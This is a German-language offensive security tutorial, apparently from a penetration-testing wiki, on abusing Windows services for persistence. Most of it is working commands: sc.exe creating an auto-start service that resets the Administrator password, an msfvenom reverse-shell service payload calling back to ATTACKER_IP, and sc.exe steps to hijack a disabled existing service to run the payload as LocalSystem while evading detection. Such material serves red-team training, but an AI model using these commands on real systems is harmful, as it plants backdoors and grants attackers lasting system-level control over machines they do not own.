# Missbrauch von Systemdiensten (Services)

Windows-Dienste bieten eine effektive Möglichkeit zur Etablierung von Persistenz, da sie so konfiguriert werden können, dass sie im Hintergrund automatisch beim Systemstart ausgeführt werden. Angreifer können dies ausnutzen, um bei jedem Hochfahren des Zielsystems die Kontrolle zurückzuerlangen.

{% hint style="info" %}
Ein Dienst ist im Wesentlichen ein Hintergrundprozess, dessen Konfiguration bestimmt, welche ausführbare Datei verwendet wird und ob der Dienst automatisch oder manuell gestartet wird. Es gibt zwei Hauptmethoden, um Dienste für persistente Zwecke zu missbrauchen:

* **Erstellen eines neuen Dienstes**
* **Manipulation/ Modifikation eines bestehenden Dienstes**
{% endhint %}

***

## **Erstellen eines neuen Dienstes**

Ein neuer Dienst kann mit dem Befehl [sc.md](../befehle/sc.md "mention").exe eingerichtet werden. Dabei wird eine gewünschte ausführbare Datei angegeben, die automatisch beim Systemstart ausgeführt wird. Ein Beispiel zur Ausführung eines Befehls über einen neuen Dienst:

```cmd
sc.exe create RMTservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start RMTservice
```

{% hint style="info" %}
Hinweis: Zwischen `binPath=` und dem Pfad muss ein Leerzeichen stehen.
{% endhint %}

In diesem Fall wird der Administrator-Passwort-Reset beim Dienststart ausgeführt. Für eine dauerhafte Hintertür empfiehlt sich jedoch die Verwendung einer speziell erstellten Reverse Shell. Dabei sollte beachtet werden, dass Dienste eine spezielle Binärstruktur benötigen, um ordnungsgemäß vom System verwaltet zu werden.

Eine kompatible Service-Binärdatei kann mit `msfvenom` wie folgt erzeugt werden:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rmt-svc.exe
```

Die generierte Datei kann anschließend auf dem Zielsystem gespeichert und über einen Dienst eingebunden werden:

```cmd
sc.exe create RMTservice2 binPath= "C:\Windows\rmt-svc.exe" start= auto
sc.exe start RMTservice2
```

Sobald der Dienst gestartet wird, wird die Reverse Shell aktiviert.

***

## **Manipulation eines bestehenden Dienstes**

Da die Erstellung neuer Dienste möglicherweise von Sicherheitstools erkannt wird, kann es sinnvoll sein, bereits vorhandene (insbesondere deaktivierte) Dienste zu modifizieren.

Zunächst kann eine Liste aller Dienste mit folgendem Befehl abgerufen werden:

```cmd
sc.exe query state= all
```

Ein Dienst, der nicht aktiv ist (z. B. `RMTservice3`), kann mit folgendem Befehl näher untersucht werden:

```cmd
sc.exe qc RMTservice3
```

Wichtige Parameter dabei sind:

* **BINARY\_PATH\_NAME** – sollte auf die eigene Payload zeigen
* **START\_TYPE** – sollte auf `AUTO_START` gesetzt sein, damit der Dienst beim Systemstart automatisch ausgeführt wird
* **SERVICE\_START\_NAME** – idealerweise `LocalSystem`, um Systemrechte zu erhalten

Durch Ändern dieser Parameter kann ein vorhandener Dienst effektiv zur Persistenznutzung umfunktioniert werden, ohne neue auffällige Spuren zu hinterlassen.

```
sc.exe config RMTservice3 binPath= "C:\Windows\rmt-svc.exe" start= auto obj= "LocalSystem"
```
